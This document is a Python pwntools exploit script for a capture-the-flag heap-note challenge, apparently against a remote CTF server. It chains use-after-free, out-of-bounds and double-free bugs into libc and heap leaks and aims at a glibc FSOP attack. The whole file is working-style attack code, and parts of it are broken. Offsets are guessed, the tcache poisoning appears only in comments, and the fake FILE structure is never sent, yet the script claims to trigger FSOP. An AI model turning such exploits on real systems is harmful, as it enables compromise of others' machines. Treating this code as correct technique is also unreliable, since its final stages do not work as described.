#!/usr/bin/env python3
"""
Crazy FSOP Exploit
------------------
Vulnerabilities:
1. No bounds check on index - can access negative/large indices
2. No size validation - can allocate size 0
3. UAF - can view freed chunks
4. Double free possible

Strategy for glibc 2.42:
1. Leak libc by freeing large chunk into unsorted bin
2. Leak heap via tcache
3. Use out-of-bounds index to overwrite GOT or other pointers
4. Alternatively, use tcache poisoning to overwrite FILE structure
5. Trigger FSOP via exit() or other FILE operations
"""

from pwn import *

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.binary = elf
context.log_level = 'info'

def start():
    if args.REMOTE:
        return remote('amt.rs', 26797)
    else:
        return process([elf.path])

def create(p, idx, size, data):
    p.sendlineafter(b'which operation: ', b'1')
    p.sendlineafter(b'which note: ', str(idx).encode())
    p.sendlineafter(b'size: ', hex(size).encode())
    p.sendafter(b'data: ', data)

def delete(p, idx):
    p.sendlineafter(b'which operation: ', b'2')
    p.sendlineafter(b'which note: ', str(idx).encode())

def view(p, idx):
    p.sendlineafter(b'which operation: ', b'3')
    p.sendlineafter(b'which note: ', str(idx).encode())
    p.recvuntil(b'data: ')
    return p.recv()

def exploit():
    p = start()

    # ========== Stage 1: Leak libc ==========
    info("Stage 1: Leaking libc address")

    # Allocate a large chunk that will go into unsorted bin when freed
    create(p, 0, 0x500, b'A' * 0x10)
    # Guard chunk to prevent consolidation with top chunk
    create(p, 1, 0x20, b'B' * 0x10)

    # Free into unsorted bin - this will have fd/bk pointing to main_arena
    delete(p, 0)

    # Leak libc from the unsorted bin chunk
    try:
        leak_data = view(p, 0)
        if len(leak_data) >= 8:
            libc_leak = u64(leak_data[:8])

            # The offset depends on exact glibc version
            # For glibc 2.42, unsorted bin is at main_arena+[offset]
            # We need to calculate: libc_base = libc_leak - (offset to main_arena)
            # Typically around 0x1f5c00 or 0x203000 range for recent glibc

            # Let's try to identify the offset
            # For glibc 2.42, check the exact offset
            possible_offsets = [0x203b20, 0x203b60, 0x1f5c00, 0x1f6cc0, 0x21ace0]

            for offset in possible_offsets:
                test_base = libc_leak - offset
                if test_base & 0xfff == 0:  # Should be page aligned
                    libc.address = test_base
                    success(f"Libc base: {hex(libc.address)}")
                    success(f"Libc leak: {hex(libc_leak)}")
                    break
        else:
            error("Failed to leak libc")
            return
    except:
        error("Failed to leak libc")
        return

    # ========== Stage 2: Leak heap ==========
    info("Stage 2: Leaking heap address")

    # Create and free chunks to get heap address in tcache
    create(p, 2, 0x100, b'C' * 0x10)
    create(p, 3, 0x100, b'D' * 0x10)
    delete(p, 2)

    try:
        heap_data = view(p, 2)
        if len(heap_data) >= 8:
            heap_leak = u64(heap_data[:8])
            # In glibc 2.42, tcache has key protection
            # The fd pointer might be mangled
            heap_base = heap_leak - 0x2a0  # Approximate
            success(f"Heap leak: {hex(heap_leak)}")
            success(f"Heap base (approx): {hex(heap_base)}")
    except:
        warn("Could not leak heap, continuing anyway")

    # ========== Stage 3: FSOP Attack ==========
    info("Stage 3: Setting up FSOP attack")

    # For glibc 2.42, we can use several FSOP techniques:
    # 1. House of Apple 2
    # 2. House of Banana
    # 3. House of Emma

    # We'll try House of Apple approach
    # Key idea: overwrite _IO_list_all or a FILE structure

    # First, let's get arbitrary write via tcache poisoning
    # Since we have OOB write, we can also directly write to GOT/BSS

    # Let's try to overwrite __malloc_hook or __free_hook equivalent
    # In newer glibc, these are removed, so we need FSOP

    # Target: _IO_list_all or stderr/stdout FILE structure
    io_list_all = libc.address + libc.symbols['_IO_list_all']
    stderr = libc.address + libc.symbols['_IO_2_1_stderr_']
    system = libc.address + libc.symbols['system']

    success(f"_IO_list_all: {hex(io_list_all)}")
    success(f"stderr: {hex(stderr)}")
    success(f"system: {hex(system)}")

    # Create chunks for tcache poisoning
    create(p, 4, 0x100, b'E' * 0x10)
    create(p, 5, 0x100, b'F' * 0x10)
    delete(p, 4)
    delete(p, 5)

    # Now we have two chunks in tcache
    # We can overwrite chunk 5's fd pointer to point to our target

    # For glibc 2.42, tcache has safe-linking (pointer mangling)
    # fd = (next >> 12) ^ ptr
    # To bypass: we need to know heap address

    # Alternative: Use the OOB write to directly corrupt structures
    # The notes array is at a known offset from other data structures

    # Let's try using negative index to write to interesting locations
    # Or use large positive index to reach GOT/other writable sections

    # For FSOP, we need to craft a fake FILE structure
    # Modern approach: use _IO_wfile_jumps or other vtable

    # Simplified FSOP payload for demonstration
    # This needs to be adjusted based on exact glibc internals

    fake_file = flat({
        0x00: 0xfbad2086,  # _flags - magic value for certain operations
        0x08: 0,           # _IO_read_ptr
        0x10: 0,           # _IO_read_end
        0x18: 0,           # _IO_read_base
        0x20: 0,           # _IO_write_base
        0x28: 1,           # _IO_write_ptr (must be > write_base)
        0x30: 0,           # _IO_write_end
        0x38: 0,           # _IO_buf_base
        0x40: 0,           # _IO_buf_end
        0xd8: libc.address + 0x1ed560,  # vtable - _IO_wfile_jumps or similar
    }, length=0xe0, filler=b'\x00')

    info("Attempting to trigger FSOP...")

    # Try to allocate at stderr location and overwrite it
    # This requires successful tcache poisoning

    # Send EOF or exit to trigger FILE operations
    p.sendline(b'999')
    p.sendline(b'0')

    p.interactive()

if __name__ == '__main__':
    exploit()
